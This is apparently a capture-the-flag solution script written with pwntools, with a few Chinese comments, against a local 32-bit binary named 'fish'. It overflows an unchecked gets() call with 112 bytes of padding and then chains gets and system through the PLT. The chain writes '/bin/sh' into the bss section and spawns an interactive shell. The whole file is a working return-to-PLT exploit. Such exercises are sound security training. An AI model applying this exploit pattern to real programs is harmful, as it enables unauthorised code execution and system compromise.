"""
puts("How many fish does the kitten eat");
return gets(s); # 需要有 1.gets/read可溢出 2.plt.system 3.有bss
"""

from pwn import *

s = process('./fish')
context.arch = 'i386'

elf = ELF('./fish')
system = elf.symbols['system']
gets = elf.symbols['gets']
bss = elf.bss()
success('system: ' + hex(system))
success('gets: ' + hex(gets))
success('bss: ' + hex(bss))

# $1: gets, system, bss -> get(bss) 返回 system
# $1, bss -> system(bss)
payload = flat('a' * 112, gets, system, bss, bss)

s.sendline(payload)
s.sendline('/bin/sh')
s.interactive()
